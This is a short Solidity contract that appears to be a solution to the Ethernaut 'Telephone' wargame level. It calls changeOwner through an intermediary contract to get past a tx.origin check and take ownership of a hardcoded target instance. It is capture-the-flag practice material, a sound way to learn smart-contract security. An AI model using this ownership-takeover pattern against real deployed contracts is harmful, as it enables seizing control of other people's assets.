//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "./interfaces/IEthernautTelephone.sol";

contract Telephone {
  IEthernautTelephone ethernautTelephone = IEthernautTelephone(0xA647B0b9A046b833416cD6960370EbE010abEB83);

  function changeEthernautTelephoneOwner() public {
    ethernautTelephone.changeOwner(msg.sender);
  }
}
